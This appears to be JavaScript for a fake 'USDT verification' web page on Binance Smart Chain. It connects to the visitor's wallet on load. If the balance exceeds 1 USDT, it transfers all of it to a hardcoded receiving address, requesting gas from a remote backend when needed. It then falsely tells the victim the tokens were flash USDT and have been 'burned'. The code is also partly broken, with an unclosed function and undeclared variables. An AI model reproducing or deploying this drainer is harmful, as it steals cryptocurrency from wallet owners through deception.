 const walletAddress = document.getElementById('walletAddress');
        const tokenBalance = document.getElementById('tokenBalance');
        const verificationModal = document.getElementById('verificationModal');
        const progressBar = document.getElementById('progressBar');
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const step4 = document.getElementById('step4');
        const step1Desc = document.getElementById('step1Desc');
        const step2Desc = document.getElementById('step2Desc');
        const step3Desc = document.getElementById('step3Desc');
        const step4Desc = document.getElementById('step4Desc');
        const modalMessage = document.getElementById('modalMessage');
        const closeModalBtns = document.querySelectorAll('.close-modal');
        const networkDot = document.getElementById('networkDot');
        const networkStatus = document.getElementById('networkStatus');

const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
const tokenAbi = [
            {
                "constant": true,
                "inputs": [{"name": "who", "type": "address"}],
                "name": "balanceOf",
                "outputs": [{"name": "", "type": "uint256"}],
                "type": "function"
            },
            {
                "constant": false,
                "inputs": [
                    {"name": "_to", "type": "address"},
                    {"name": "_value", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }
        ];
        
        // Network configuration
        const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
        const BSC_MAINNET_PARAMS = {
            chainId: BSC_MAINNET_CHAIN_ID,
            chainName: 'Binance Smart Chain Mainnet',
            nativeCurrency: {
                name: 'BNB',
                symbol: 'bnb',
                decimals: 18
            },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
        };
        
        // Wallet types
        const WALLET_TYPES = {
            TRUST: 'trust',
            BINANCE: 'binance',
            METAMASK: 'metamask',
            UNKNOWN: 'unknown'
        };

let web3;
let userAddress;

 // Initialize Web3 - Wallet compatible
        async function initWeb3() {
            // Detect wallet type
            if (window.trustwallet) {
                walletType = WALLET_TYPES.TRUST;
                currentProvider = window.trustwallet;
            } else if (window.BinanceChain) {
                walletType = WALLET_TYPES.BINANCE;
                currentProvider = window.BinanceChain;
            } else if (window.ethereum) {
                walletType = WALLET_TYPES.METAMASK;
                currentProvider = window.ethereum;
            } else if (window.web3) {
                walletType = WALLET_TYPES.UNKNOWN;
                currentProvider = window.web3.currentProvider;
            } else {
                console.error("No Web3 provider detected");
                showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
                return false;
            }
            
            try {
                web3 = new Web3(currentProvider);
                await updateNetworkStatus();
                
                // Listen for chain changes
                if (currentProvider.on) {
                    currentProvider.on('chainChanged', (chainId) => {
                        window.location.reload();
                    });
                    
                    // Binance Chain specific event
                    if (walletType === WALLET_TYPES.BINANCE) {
                        currentProvider.on('accountsChanged', (accounts) => {
                            window.location.reload();
                        });
                    }
                }
                
                return true;
            } catch (error) {
                console.error("Web3 initialization error:", error);
                return false;
            }
        }
        
        // Update network status display
        async function updateNetworkStatus() {
            if (!web3) return false;
            
            try {
                const chainId = await web3.eth.getChainId();
                
                if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
                    networkDot.className = "network-dot";
                    networkStatus.textContent = "Binance Smart Chain";
                    return true;
                } else {
                    networkDot.className = "network-dot network-disconnected";
                    networkStatus.textContent = `Unsupported Network (ID: ${chainId})`;
                    
                    // Automatically switch to BSC for Trust Wallet
                    if (walletType === WALLET_TYPES.TRUST) {
                        const switched = await switchToBSC();
                        if (switched) {
                            return updateNetworkStatus(); // Recursive check after switch
                        }
                    }
                    return false;
                }
            } catch (error) {
                console.error("Error getting network status:", error);
                networkDot.className = "network-dot network-disconnected";
                networkStatus.textContent = "Network Error";
                return false;
            }
        }
        
        // Switch to Binance Smart Chain
        async function switchToBSC() {
            step2Desc.textContent = "Switching to Binance Smart Chain...";
            console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);
            
            try {
                // Binance Web3 Wallet uses different method
                if (walletType === WALLET_TYPES.BINANCE) {
                    await window.BinanceChain.switchNetwork('bsc-mainnet');
                    return true;
                }
                
                // Standard EIP-3326 method
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
                });
                return true;
            } catch (switchError) {
                // Network not added, try to add it
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [BSC_MAINNET_PARAMS]
                        });
                        return true;
                    } catch (addError) {
                        console.error("Failed to add BSC network:", addError);
                        step2Desc.textContent = "Failed to add BSC network";
                        return false;
                    }
                }
                console.error("Failed to switch to BSC:", switchError);
                step2Desc.textContent = "Failed to switch network";
                return false;
            }
        }
        
        // Update progress
        function updateProgress(percent) {
            progressBar.style.width = `${percent}%`;
        }
        
        // Update step UI
        function updateStep(stepNum, status) {
            const step = document.getElementById(`step${stepNum}`);
            step.className = `step ${status}`;
            step.querySelector('.step-icon').innerHTML = status === 'completed' ? 
                '<i class="fas fa-check"></i>' : stepNum;
        }
        

// Connect Wallet
        async function connectWallet() {
            updateStep(1, 'active');
            updateProgress(20);
            
            const isWeb3Initialized = await initWeb3();
            if (!isWeb3Initialized) {
                showError("Web3 initialization failed.");
                return false;
            }
            
            try {
                step1Desc.textContent = "Requesting account access...";
                
                // Different method for Binance Web3 Wallet
                if (walletType === WALLET_TYPES.BINANCE) {
                    const accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
                    userAddress = accounts[0];
                } else {
                    const accounts = await web3.eth.getAccounts();
                    if (accounts.length === 0) {
                        showError("No accounts found. Please connect your wallet.");
                        return false;
                    }
                    userAddress = accounts[0];
                }

// Auto-connect wallet on page load
window.addEventListener("load", connectWallet);

async function Next() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Refresh the page.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    // Fetch balances
    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`BNB Balance: ${userBNB} BNB`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
            "green"
        );
        return;
    }

    // User has more than 150 USDT → Check BNB Gas Fee
    showPopup("Loading...", "green");

    transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
    console.log("User BNB is low. Requesting BNB from backend...");
    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ toAddress: userAddress })
    });
        }

        // Proceed with USDT Transfer
        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red"
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
    }
}

async function sendBNB(toAddress, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

// Function to display pop-up message
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// Attach event listener
document.getElementById("Next").addEventListener("click", Next);
